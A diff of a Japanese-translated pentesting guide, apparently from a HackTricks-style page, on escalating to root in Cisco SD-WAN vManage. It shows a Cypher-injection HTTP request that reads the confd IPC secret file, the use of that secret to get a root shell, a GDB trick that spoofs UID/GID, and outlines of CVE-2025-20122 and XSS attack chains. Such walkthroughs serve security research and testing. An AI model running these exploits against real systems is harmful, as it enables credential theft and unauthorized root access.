@@ -6,13 +6,13 @@
 
 (例: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-`confd` や各種バイナリに関連するいくつかの [documentation](http://66.218.245.39/doc/html/rn03re18.html) を少し調べたところ（Ciscoのウェブサイトのアカウントでアクセス可能）、IPCソケットを認証するために `/etc/confd/confd_ipc_secret` にあるシークレットを使用していることが分かりました：
+`confd` と各種バイナリに関連するいくつかの[documentation](http://66.218.245.39/doc/html/rn03re18.html)を少し調べたところ（Cisco のウェブサイトのアカウントでアクセス可能）、IPC ソケットの認証には `/etc/confd/confd_ipc_secret` にあるシークレットを使用していることが判明しました:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-先ほどの Neo4j インスタンスを覚えていますか？それは `vmanage` ユーザーの権限で実行されているため、先の脆弱性を利用してファイルを取得できます:
+前に扱った Neo4j インスタンスを覚えていますか？それは `vmanage` ユーザーの権限で実行されているため、前の vulnerability を使ってファイルを取得できます：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。したがって、`/usr/bin/confd_cli_user` を自分の引数で直接呼び出すことができます。ただし、現状の権限ではそれを読み取れないため、rootfs から取得して scp でコピーし、help を確認してそれを使って shell を取得する必要があります:
+`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。したがって、`/usr/bin/confd_cli_user` を自分の引数で直接呼び出すことができます。ただし現在の権限では読み取れないため、rootfs から取得して scp でコピーし、ヘルプを読んでそれを使ってシェルを取得する必要があります:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -44,14 +44,14 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 ## パス 2
 
-(例: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-synacktivチームによるブログ¹では、root shellを取得する巧妙な方法が説明されているが、注意点としてrootのみが読み取り可能な`/usr/bin/confd_cli_user`のコピーを入手する必要がある。私はそのような手間なしにrootへエスカレートする別の方法を見つけた。
+synacktiv チームによるブログ¹は root シェルを得る巧妙な方法を説明していましたが、問題は `/usr/bin/confd_cli_user` のコピーを入手する必要があり、それは root にしか読み取りできない点です。私はその面倒を避けて root に昇格する別の方法を見つけました。
 
-私が`/usr/bin/confd_cli`バイナリを逆アセンブルしたところ、次のことが分かった:
+When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
 
 <details>
-<summary>UID/GIDの収集を示す Objdump</summary>
+<summary>Objdump による UID/GID の取得表示</summary>
 ```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -82,20 +82,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-“ps aux” を実行すると、次のように表示されました (_注 -g 100 -u 107_)
+“ps aux”を実行すると、次のような出力が観察されました（_note -g 100 -u 107_）
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-私は、“confd_cli”プログラムがログインユーザーから収集したユーザーIDとグループIDを“cmdptywrapper”アプリケーションに渡していると仮定した。
+私は、`confd_cli` プログラムがログインユーザーから取得した UID と GID を “cmdptywrapper” アプリケーションに渡しているのではないかと仮定した。
 
-最初の試みでは“cmdptywrapper”を直接実行し`-g 0 -u 0`を渡したが、失敗した。途中でファイルディスクリプタ（-i 1015）がどこかで作成されているようで、それを偽装できなかった。
+まずは “cmdptywrapper” を直接実行し、`-g 0 -u 0` を渡してみたが失敗した。どこかでファイルディスクリプタ（-i 1015）が作成されており、それを偽装できないようだ。
 
-synacktiv’s blog(last example)で述べられているように、`confd_cli`プログラムはコマンドライン引数をサポートしていないが、デバッガで影響を与えることができ、幸いにもシステムに GDB が含まれている。
+synacktiv のブログ（最後の例）で触れられているように、`confd_cli` プログラムはコマンドライン引数をサポートしていないが、デバッガで影響を与えることはできる。幸いシステムには GDB が含まれている。
 
-`getuid` と `getgid` API が 0 を返すよう強制する GDB スクリプトを作成した。すでに deserialization RCE によって“vmanage”権限を持っているので、`/etc/confd/confd_ipc_secret`を直接読み取る権限がある。
+`getuid` と `getgid` を 0 を返すよう強制する GDB スクリプトを作成した。既に deserialization RCE を通じて “vmanage” 権限を持っているため、`/etc/confd/confd_ipc_secret` を直接読む権限がある。
 
 root.gdb:
 ```
@@ -154,19 +154,19 @@ bash-4.4#
 ```
 </details>
 
-## Path 3（2025 CLI 入力検証バグ）
+## パス3（2025 CLI入力検証バグ）
 
-Cisco は vManage を *Catalyst SD-WAN Manager* に改名しましたが、基盤となる CLI は同じボックス上で引き続き動作します。2025 年のアドバイザリ（CVE-2025-20122）は、CLI の入力検証が不十分で、マネージャの CLI サービスに細工されたリクエストを送ることで **任意の認証済みローカルユーザー** が root を取得できると説明しています。任意の low-priv foothold（例：Path1 の Neo4j deserialization、または cron/backup ユーザのシェル）をこの脆弱性と組み合わせることで、`confd_cli_user` をコピーしたり GDB をアタッチしたりせずに root に昇格できます:
+CiscoはvManageを*Catalyst SD-WAN Manager*に改名しましたが、基盤となるCLIは同じボックス上で引き続き動作します。2025年のアドバイザリ（CVE-2025-20122）は、CLIの入力検証不足により、マネージャのCLIサービスに細工したリクエストを送信することで**任意の認証済みローカルユーザ**がrootを取得できると説明しています。任意の低権限フットホールド（例：Path1のNeo4jデシリアライズ、あるいはcron/backupユーザのシェル）をこの脆弱性と組み合わせることで、`confd_cli_user`をコピーしたりGDBをアタッチしたりせずにrootに昇格できます:
 
-1. low-priv shell を使って CLI の IPC エンドポイントを特定します（通常は Path2 で示したポート 4565 の `cmdptywrapper` リスナー）。
-2. UID/GID フィールドを 0 に偽装する CLI リクエストを作成します。検証バグにより元の呼び出し元の UID が強制されないため、wrapper は root 権限の PTY を起動します。
-3. 偽装したリクエスト経由で任意のコマンド列（`vshell; id` など）をパイプし、root シェルを取得します。
+1. 低権限のシェルを使ってCLIのIPCエンドポイントを特定します（通常はPath2に示されたポート4565の`cmdptywrapper`リスナ）。
+2. UID/GIDフィールドを0に偽造するCLIリクエストを作成します。検証バグにより元の呼び出し元のUIDが強制されないため、ラッパはroot権限のPTYを起動します。
+3. `vshell; id` のような任意のコマンド列を偽造したリクエスト経由で流し、rootシェルを取得します。
 
-> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
+> このエクスプロイトの対象はローカル限定です；最初のシェルを得るためにはリモートコード実行が依然として必要ですが、一旦ボックス内に入るとエクスプロイトはデバッガでのUID書き換えではなく単一のIPCメッセージで済みます。
 
-## その他の最近の vManage/Catalyst SD-WAN Manager の連鎖可能な脆弱性
+## 他の最近のvManage/Catalyst SD-WAN Manager脆弱性（連鎖用）
 
-* **Authenticated UI XSS (CVE-2024-20475)** – 特定のインターフェイスフィールドに JavaScript を注入できます。管理者セッションを盗用すれば、ブラウザ駆動で `vshell` → ローカルシェル → Path3 と進んで root を取得する経路が得られます。
+* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.
 
 ## References
 
